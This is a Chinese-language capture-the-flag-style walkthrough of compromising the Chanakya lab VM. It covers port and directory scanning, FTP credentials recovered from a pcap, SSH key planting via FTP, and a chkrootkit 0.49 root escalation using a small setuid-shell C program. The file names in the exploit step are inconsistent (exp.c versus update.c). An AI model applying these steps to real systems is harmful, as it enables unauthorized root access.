# Chanakya靶机渗透测试

首先通过主机发现发现到靶机的IP地址为:172.16.10.141  
然后使用nmap工具对其进行扫描:nmap -sC -sV -sS -p- 172.16.10.141  
![image-20211111151901222](https://image.3001.net/images/20211111/1636619685_618cd5a5112eb6275f206.png!small)

发现目标靶机开启了80,22,21等多个端口，  
访问80端口,发现是一个普通的页面,点击进入多个界面也没有其他有用的信息,然后就分别使用nikto和dirb等工具对其进行扫描。  
![image-20211111152107562](https://image.3001.net/images/20211111/1636619686_618cd5a6e58521c4dad36.png!small)  
没有找到有用的信息,然后用dirb进行目录扫描,这边要注意的是普通dirb扫描目录扫描不出来关键的文件  
需要知道一些后缀才可以扫描出关键的文件。  
![image-20211111152337291](https://image.3001.net/images/20211111/1636619688_618cd5a8724bd0fe4020b.png!small)  
普通的dirb目录扫描并没有发现一些重要的信息,但是指定一些后缀则会。  
![image-20211111152523268](https://image.3001.net/images/20211111/1636619689_618cd5a9ec085fe61d716.png!small)  
指定文件则会扫描出来关键的目录,.html结尾的文件都是主页上可以打开的文件,而关键性文件则是abuse.txt文件。  
访问abuse.txt文件：  
![image-20211111152651503](https://image.3001.net/images/20211111/1636619691_618cd5ab3dec51d5b0627.png!small)  
发现回显,根据服务器开启的服务分析回显的文本,并没有任何头绪，  
但是文本经过ROT13进行解密之后,可以发现是一个数据包的名字。  
![image-20211111152829365](https://image.3001.net/images/20211111/1636619692_618cd5ac05b933b70413a.png!small)  
然后访问172.16.10.141/ashoka.pcapng  
就自动下载数据包,打开数据包分析,发现重要信息都是ftp的流量，  
然后筛选FTP流量,发现登陆的用户名和密码。  
![image-20211111152959489](https://image.3001.net/images/20211111/1636619692_618cd5ace2bb39269bcf3.png!small)  
发现登陆的用户名和密码:ashoka:kautilya  
然后登陆ftp服务，  
![image-20211111153353983](https://image.3001.net/images/20211111/1636619693_618cd5add9b8f4a0732d6.png!small)  
发现很多隐藏文件,但是将文件下载到本地发现并没有什么有用信息，  
然后很多系统中重要的文件都是没有权限进行访问和修改的。  
靶机服务器还开启了ssh服务,可以尝试一下ssh密钥免密码登陆，  
首先再在kali的主机上使用命令ssh-keygen生成密钥。  
![image-20211111153704735](https://image.3001.net/images/20211111/1636619695_618cd5af4519108067444.png!small)  
然后再使用命令cat id_rsa.pub > authorized_keys生成一个密钥,然后再使用ftp传输ssh免密码登陆，  
首先需要登陆的靶机使用ssh-keygen生成一个密钥,然后使用cat
id_rsa.pub>authorized_keys生成一个密钥文件,将这个密钥文件传输到需要被登陆的机器的用户的根目录中的.ssh/文件夹下,然后就可以直接ssh登陆,从而不需要密码到靶机上,直接ssh进行连接就可以连接到ashoka用户。  
进入靶机后,对靶机进行信息收集,发现/tmp目录下有一个logs日志文件,查看logs日志文件,发现它是一个Chkrootkit测试结果的日志文件。  
那么首先推测Chrootkit可以被我们利用,然后提权，  
进一步查看Chrootkit权限。

    
    
    find / -name chrootkit* 2>/dev/null
    cd /user/local/share/chkrootkit
    ./chrootkit -V

Chkrootkit0.49以及以下版本均存在本地提权漏洞，只要提权上传一个文件到tmp目录，管理员再次运行Chkrootkit后，即可获取root权限。  
![image-20211111155913490](https://image.3001.net/images/20211111/1636619696_618cd5b05cfc14529f6d4.png!small)  
然后编写exp.c脚本进行提权：

    
    
    #include <unistd.h>
    void main(void)
    {
        system("chown root:root /tmp/update");
        system("chmod 4755 /tmp/update");
        setuid(0);
        setgid(0);
        execl("/bin/sh","sh",NULL);
    }
    

然后对脚本进行编译和执行  
gcc update.c -o update  
得到一个update可执行文件，  
然后运行文件,就获取到一个shell,并且为root权限。  
![image-20211111160337791](https://image.3001.net/images/20211111/1636619697_618cd5b16f3a6a07fb9f2.png!small)

